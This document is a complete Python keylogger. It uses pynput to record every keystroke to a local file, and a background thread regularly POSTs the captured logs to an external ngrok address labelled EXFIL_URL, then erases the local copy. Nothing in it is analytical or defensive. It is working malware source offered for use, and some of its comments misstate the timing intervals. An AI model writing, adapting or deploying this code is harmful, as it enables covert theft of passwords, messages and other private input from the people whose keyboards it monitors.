import threading
import time
import requests
from pynput import keyboard
from datetime import datetime

# Global log list and lock for thread-safe access
log_buffer = []
log_lock = threading.Lock()
LOG_FILE = 'keylog.txt'

# Remote URL to send logs
EXFIL_URL = 'https://94f81e9ffeb2.ngrok-free.app'

# Runtime flag
running = True

# Function to write accumulated logs to file every second
def periodic_write_to_file():
    while running:
        time.sleep(5)
        with log_lock:
            if log_buffer:
                timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
                with open(LOG_FILE, "a") as f:
                    f.write(f"{timestamp} {''.join(log_buffer)}\n")
                log_buffer.clear()

# Function to send logs to server every 60 seconds
def periodic_send_logs():
    while running:
        time.sleep(10)
        with log_lock:
            try:
                with open(LOG_FILE, 'r') as f:
                    content = f.read()
                if content.strip():
                    response = requests.post(EXFIL_URL, data={'logs': content})
                    print(f"[+] Logs sent - Status: {response.status_code}")
                    # Clear local file after successful send
                    open(LOG_FILE, 'w').close()
            except Exception as e:
                print(f"[!] Failed to send logs: {e}")

# Listener callback function
def on_press(key):
    global running
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name}]"

    with log_lock:
        log_buffer.append(k)

    if key == keyboard.Key.esc:
        print("[!] ESC pressed. Exiting keylogger.")
        running = False
        return False

# Main function
def main():
    # Start background threads
    threading.Thread(target=periodic_write_to_file, daemon=True).start()
    threading.Thread(target=periodic_send_logs, daemon=True).start()

    # Start the keylogger
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
